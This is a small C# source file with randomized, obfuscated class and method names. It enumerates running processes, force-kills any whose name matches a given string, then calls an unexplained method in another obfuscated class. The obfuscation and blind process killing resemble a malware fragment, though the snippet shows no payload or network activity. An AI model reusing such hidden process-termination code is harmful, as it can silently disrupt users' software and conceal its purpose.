using System;
using System.Diagnostics;

namespace jtAYXTgtXeY;

public sealed class DtaUHpTAlTXgk
{
	public static bool xjUokHsvOQWIh(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ZFxNdyCobSW(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (xjUokHsvOQWIh(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					efoRmwagKuQD.uwDYbufYIoAuT();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
